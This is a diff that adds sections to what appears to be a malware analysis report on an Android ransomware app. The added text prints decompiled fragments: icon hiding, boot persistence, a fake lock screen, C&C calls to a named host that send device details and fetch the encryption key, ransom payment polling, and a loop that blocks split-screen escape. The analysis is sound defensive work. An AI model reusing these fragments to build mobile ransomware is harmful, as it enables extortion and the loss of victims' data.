@@ -353,7 +353,7 @@ Indeed the `<receiver>` element includes an intent filter that intercepts both t
 </intent-filter>
 ```
 #v(0.5em)
-In this way, as soon as Android finishes its startup, the framework sends the corresponding intent and triggers the `onReceive()` method of `OnBoot.java` file (see @receivers_clashprivate).
+In this way, as soon as Android finishes its startup or its reboot, the framework sends the corresponding intent and triggers the `onReceive()` method of `OnBoot.java` file (see @receivers_clashprivate).
 #linebreak()
 #linebreak()
 Below we can see the code of `OnBoot.java`, when the boot occurs the receiver creates an explicit intent targeting the LockActivity class and sets the flag `FLAG_ACTIVITY_NEW_TASK` (268 435 456) to start an user activity. Since there are no additional checks or validations on the incoming intent’s contents, every device restart causes LockActivity to be launched in the background acting as a fake lock screen.
@@ -368,3 +368,253 @@ public class OnBoot extends BroadcastReceiver {
 ```
 #v(0.5em)
 In this manner on one hand, the malware ensures its persistence: even if the user tries to uninstall the app or reboot the device, on the next power‐on the receiver guarantees that LockActivity is immediately launched; on the other hand, simply running LockActivity from the start allows the malware to hide its malicious operations.
+
+=== Activities
+
+Within the malware, there are two main activities: `com.ins.screensaver.MainActivity` e `com.ins.screensaver.LockActivity` as shown by the MobSF interface (@mainactivities_clashprivate).
+
+#v(0.5em)
+#columns(2)[
+ #figure(
+  image("/img/mainactivities_clashprivate.png", width: 80%),
+  caption: [
+    Malware activities (MobSF)
+  ], 
+)
+#label("mainactivities_clashprivate")
+#colbreak()
+  #v(2em)
+  #figure(
+  [
+    Despite this, VirusTotal lists only a single main activity, namely LockActivity. This is because MainActivity is responsible solely for hiding the app’s icon and immediately redirecting execution to the other activity.
+  ], 
+)
+]
+#v(1.5em)
+#linebreak()
+*MainActivity*
+#linebreak()
+#v(0.5em)
+This file represents the visible entry point of the application, i.e., the activity declared in the manifest as `LAUNCHER`.
+#v(0.5em)
+```xml
+<activity android:name="com.ins.screensaver.MainActivity">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.DEFAULT" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+</activity>
+```
+#v(0.5em)
+
+Analyzing the code, we can see that within the `onCreate()` method two main operations are executed:
+#v(0.5em)
+```java
+public void onCreate(Bundle savedInstanceState) {
+  ...
+  getPackageManager().setComponentEnabledSetting(
+    componentToDisable,
+    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+    PackageManager.DONT_KILL_APP
+  );
+
+  startActivity(new Intent(this, 
+  (Class<?>) LockActivity.class).setFlags(268435456));
+}```
+#v(0.5em)
+The first part uses `setComponentEnabledSetting(...)` with the value
+`COMPONENT_ENABLED_STATE_DISABLED` so that the app’s icon is removed from the launcher and the activity can no longer be launched manually, and with `DONT_KILL_APP` to prevent the system from immediately killing the entire app. This removes the app’s icon from the launcher and prevents the user from manually reopening it.
+
+Immediately afterward, an explicit Intent for `LockActivity` is created and started with `FLAG_ACTIVITY_NEW_TASK`, ensuring that the malicious component runs as soon as the user opens the app for the first time.
+#v(2em)
+#v(0.5em)
+#linebreak()
+*LockActivity*
+#linebreak()
+#v(0.5em)
+The LockActivity is the heart of the malicious operation: once launched, it displays a fake lock screen to the user, manages persistence flags, and simultaneously encrypts the device’s data recursively. The following describes its operational flow in greater detail.
+#v(1em)
+1. *LockActivity.onCreate():* This method is called as soon as the activity is created. Initially, it inflates the layout defined in `activity_main.xml`, which includes a WebView to display ransom messages and a payment button; immediately afterward, it calls the `runTask()` method.
+#v(0.5em)
+```java
+public void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    runTask();
+}
+```
+#v(1em)
+
+2. *LockActivity.runTask():* Inside this method, the first important check concerns the `worked` flag, managed via the `Memory` class. This flag indicates whether the initial encryption of data (files and contacts) has already been performed at least once, thus avoiding re-encrypting on every launch. If encryption has not yet occurred, the previously described permissions are requested, as seen in the following code:
+#v(0.5em)
+```java
+if (!new Memory(this).readMemoryKey("worked").equalsIgnoreCase("1")) {
+    ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.WRITE_CONTACTS"}, 1);
+}
+...
+new Memory(this).writeMemory("worked", "1");
+```
+#v(0.2em)
+Successivamente il flag viene imopstato a "1".
+#linebreak()
+#linebreak()
+At this point, once the necessary permissions are granted, *LockActivity* sets a new wallpaper behind the fake lock screen.
+#v(0.5em)
+```java
+Memory _mem = new Memory(this);
+String done = _mem.readMemoryKey("worked");
+if (done.isEmpty()) {
+    getBaseContext().setWallpaper(mBitmap);
+}
+```
+#v(0.5em)
+The method then starts a thread responsible for retrieving the encryption key from the C&C server and encrypting files and contacts based on that key, as shown by the code below:
+#v(0.5em)
+```java
+    ...
+    LockActivity.this.key[0] = new HttpClient().getReq("http://timei2260.myjino.ru/gateway/attach.php?uid=" + Utils.generateUID() + "&os=" + Build.VERSION.RELEASE + "&model=" + URLEncoder.encode(Build.MODEL) + "&permissions=0&country=" + telephonyManager.getNetworkCountryIso());
+    ...
+
+    if (ActivityCompat.checkSelfPermission(LockActivity.this.getApplicationContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == 0) 
+    {
+      ...
+      LockActivity.this.encryptFiles(LockActivity.this.key[0]);
+    }
+    if (ActivityCompat.checkSelfPermission(LockActivity.this.getApplicationContext(), "android.permission.WRITE_CONTACTS") == 0 && ActivityCompat.checkSelfPermission(LockActivity.this.getApplicationContext(), "android.permission.READ_CONTACTS") == 0) 
+    {
+      ...  
+      LockActivity.this.encryptContacts(LockActivity.this.key[0]);
+}
+```
+#v(0.5em)
+After starting the encryption, LockActivity proceeds to display a ransom message to the user in the WebView and to handle payment verification before initiating decryption. In particular, the `showMessage(WebView webView, Resources resources)` method creates a thread that makes an HTTP request to the C&C server to obtain ransom details (unique ID, requested amount, wallet address).
+#v(0.5em)
+```java
+private void showMessage(final WebView webView, final Resources resources) {
+    ...
+    String response = new HttpClient().getReq("http://timei2260.myjino.ru/gateway/settings.php?uid=" + Utils.generateUID());
+    final String id = response.split("\\|")[0];
+    final String sum = response.split("\\|")[1];
+    final String num = response.split("\\|")[2];
+    ...
+}
+```
+#v(0.5em)
+Once received, these values are loaded into the WebView.
+#v(0.5em)
+```java
+public void run() {
+            String newContent = resources.getString(R.string.message);
+            webView.loadData(newContent.replace("{{WALLET}}", num).replace("{{SUM}}", sum).replace("{{ID}}", id), "text/html; charset=UTF-8", null);
+}
+```
+#v(0.5em)
+Immediately after calling `showMessage()` method, the malware ensures that the payment button (`payClick`) responds to every tap by calling the following method:
+#v(0.5em)
+```java
+payClick.setOnClickListener(new AnonymousClass3(webView, resources));
+```
+#v(0.5em)
+Thus, each time the button is pressed, not only is the message reloaded (to allow for any updates to the ransom conditions), but a second thread is also started to check whether the payment has arrived.
+#v(0.5em)
+```java
+public void run() {
+    ...
+        final String response = new HttpClient().getReq("http://timei2260.myjino.ru/gateway/check.php?uid=" + Utils.generateUID());
+    ...
+
+```
+#v(0.5em)
+In the code above, this thread reconstructs the phone’s UID, sends another GET request to `http://timei2260.myjino.ru/gateway/check.php?uid=<UID>`, and awaits the server’s response.
+#linebreak()
+#linebreak()
+If the server returns a string whose first part is not `true`, it means the payment has not yet been received; in this case, the app quickly shows a Toast with the Russian message “Оплата не поступила” (“Payment not received”), awaiting another user attempt:
+#v(0.5em)
+```java
+if (!response.split("\\|")[0].equalsIgnoreCase("true")) {
+    Toast.makeText(LockActivity.this.getApplicationContext(), "Оплата не поступила", 1).show();
+    return;
+}
+```
+#v(0.5em)
+When instead the server’s response is “true|\<key\>”, the app retrieves the second part of the response, the decryption key, and writes it to the `SharedPreferences` file, setting the flag "finished" = "1". This indicator serves to track that decryption has started or been completed, preventing future ransom or re-encryption attempts:
+#v(0.5em)
+```java
+final String key = response.split("\\|")[1];
+try {
+    new Memory(LockActivity.this.getApplicationContext()).writeMemory("finished", "1");
+} catch (Exception e) {
+    e.printStackTrace();
+}
+```
+#v(0.5em)
+Immediately after saving "finished", LockActivity launches two independent threads: one to decrypt files and one to decrypt contacts. When both threads finish their work, all files and contacts reappear in their original form, as if encryption had never occurred.
+#v(0.5em)
+```java
+new Thread(new Runnable() {
+    @Override
+    public void run() {
+        LockActivity.this.decryptFiles(decryptionKey);
+    }
+
+new Thread(new Runnable() {
+    @Override
+    public void run() {
+        LockActivity.this.decryptContacts(decryptionKey);
+    }
+}).start();
+```
+#v(0.5em)
+Finally, once the decryption threads are started, LockActivity shows a confirmation Toast (in Russian: “Вы успешно сняли блокировку с телефона!” – “You have successfully removed the lock from your phone!”) and calls `finish()` o close its interface, as seen in the code below. From that moment on, the user can freely use the device again.
+#v(0.5em)
+```java
+Toast.makeText(
+    LockActivity.this.getApplicationContext(),
+    "Вы успешно сняли блокировку с телефона!",
+    Toast.LENGTH_LONG
+).show();
+LockActivity.this.finish();
+```
+#v(0.5em)
+Regarding the algorithm used for encryption and decryption, the malware uses AES:
+#v(0.5em)
+```java
+String encryptedName = Base64.encodeToString(AES.encrypt(key, name.getBytes()), 0);
+```
+#v(0.5em)
+Specifically, within the fil `AES.java` we can see that it uses the `javax.crypto.Cipher` library,  which, if not otherwise specified, defaults to ECB mode with PKCS5Padding.
+#v(0.5em)
+```java
+public class AES {
+    public static byte[] encrypt(byte[] key, byte[] clear) throws Exception {
+        SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
+        Cipher cipher = Cipher.getInstance("AES");
+```
+#v(1em)
+In addition to the encryption and ransom-display logic, LockActivity includes a function that prevents the user from exploiting Android’s multi-window mode to “escape” the malicious screen. In Android versions that support Multi-Window Mode, a background thread continuously checks whether the activity has entered split-screen mode.
+```java
+if (Build.VERSION.SDK_INT >= 24) {
+  LockActivity.this.multiWindowCheck();
+}
+```
+If it detects this, the following function is executed:
+```java
+    public void multiWindowCheck() {
+        while (true) {
+            if (Build.VERSION.SDK_INT >= 24 && isInMultiWindowMode()) {
+                Utils.pressHome(this);
+            }
+        }
+    }
+```
+This function, in turn, calls another function present in the file `Utils.java`:
+```java
+    public static void pressHome(Context context) {
+        Intent home = new Intent("android.intent.action.MAIN");
+        home.addCategory("android.intent.category.HOME");
+        home.setFlags(268435456);
+        context.startActivity(home);
+    }
+```
+This code creates an intent directed to the Android Home screen (launching the default launcher) and executes it immediately. The user therefore cannot move LockActivity into split-screen mode: as soon as Android positions the app in a reduced area, the control thread brings it back to the foreground or even to the launcher, forcing the user to remain “locked” in LockActivity at full-screen.
